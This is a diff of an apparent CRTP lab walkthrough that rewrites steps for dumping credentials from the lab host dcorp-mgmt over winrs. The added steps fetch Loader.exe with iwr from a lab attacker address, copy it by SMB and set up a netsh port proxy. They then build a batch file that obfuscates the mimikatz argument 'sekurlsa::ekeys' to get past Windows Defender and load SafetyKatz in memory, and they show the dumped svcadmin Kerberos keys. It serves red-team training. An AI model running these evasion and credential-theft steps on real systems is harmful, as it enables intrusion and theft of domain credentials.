@@ -113,33 +113,107 @@ This information allows us to potentially exploit these sessions using technique
 **Tools Used:** SafetyKatz.exe
 
 ### **Abuse using winrs**
-First, we check if we can execute commands on dcorp-mgmt and confirm if the winrm port is open:
+To extract credentials from dcorp-mgmt, we will use SafetyKatz.exe. We need to avoid direct detection, so we'll transfer Loader.exe from dcorp-ci to dcorp-mgmt.
+
+1. Ensure WinRM Port is Open 
+First, check if you can execute commands on dcorp-mgmt and confirm if the WinRM port is open:
 
 ![Result](/img/crtp/result7.png){: width="972" height="589" }
+_If successful, you should see output similar to_
 
-Now, our objective is to extract credentials using SafetyKatz.exe on dcorp-mgmt. To achieve this covertly, we'll transfer **Loader.exe** from dcorp-ci to dcorp-mgmt to avoid downloading directly onto dcorp-mgmt.
+2. Download Loader.exe
+Download Loader.exe to dcorp-ci:
 
-Downloading Loader.exe
 ```bash
 iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 
-Copying Loader.exe to dcorp-mgmt
+3. Copy Loader.exe to dcorp-mgmt
+Copy Loader.exe from dcorp-ci to dcorp-mgmt:
+
 ```bash
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-Setting up Port Forwarding
-To further evade detection on dcorp-mgmt, we establish port forwarding using winrs. 
-It's important to use $null for output redirection to avoid issues with command execution.
+4. Set Up Port Forwarding
+Establish port forwarding on dcorp-mgmt to evade detection. Use $null for output redirection to prevent command execution issues:
+
 ```bash
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 
-listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
 ```
 
-Additional Considerations
-- Encoded Arguments: To bypass Windows Defender on dcorp-mgmt, encode arguments passed to Loader.exe for commands like sekurlsa::ekeys.
+5. Generate Encoded Arguments
+To bypass Windows Defender on dcorp-mgmt, encode arguments passed to Loader. Run the below command on the student VM to generate encoded arguments for sekurlsa::ekeys (this step does not need to be run on the reverse shell):
 
-Note that Windows Defender on dcorp-mgmt would detect SafetKatz execution even when used with Loader. To avoid that, let’s pass encoded arguments to the Loader. 
+```bash
+ArgSplit.bat
+```
 
-First, run the below command on the student VM to generate encoded arguments for “sekurlsa::ekeys “ (not required to be run on the reverse shell):
+![Result](/img/crtp/result8.png){: width="972" height="589" }
+
+6. Create Batch File
+Create a batch file with the encoded arguments. Below are the contents of the batch file(Safety.bat):
+```bash
+@echo off
+set "z=s"
+set "y=y"
+set "x=e"
+set "w=k"
+set "v=e"
+set "u=:"
+set "t=:"
+set "s=a"
+set "r=s"
+set "q=l"
+set "p=r"
+set "o=u"
+set "n=k"
+set "m=e"
+set "l=s"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
+echo %Pwn%
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn%
+exit
+```
+
+Download the batch file on dcorp-ci:
+```bash
+iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat
+```
+
+7. Copy Safety.bat to dcorp-mgmt
+Copy the batch file from dcorp-ci to dcorp-mgmt:
+
+```bash
+echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
+```
+
+8. Execute Safety.bat
+Run the batch file on dcorp-mgmt that uses Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:
+
+```bash
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat"
+```
+
+If successful, you should see output similar to:
+
+```bash
+Authentication Id : 0 ; 58866 (00000000:0000e5f2)
+Session : Service from 0
+User Name : svcadmin
+Domain : dcorp
+Logon Server : DCORP-DC
+Logon Time : 3/3/2023 2:39:12 AM
+SID : S-1-5-21-719815819-3726368948-3917688648-1118
+ * Username : svcadmin
+ * Domain : DOLLARCORP.MONEYCORP.LOCAL
+ * Password : (null)
+* Key List :
+ aes256_hmac 
+6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+ rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
+ rc4_hmac_old b38ff50264b74508085d82c69794a4d8
+ rc4_md4 b38ff50264b74508085d82c69794a4d8
+ rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
+ rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
+```
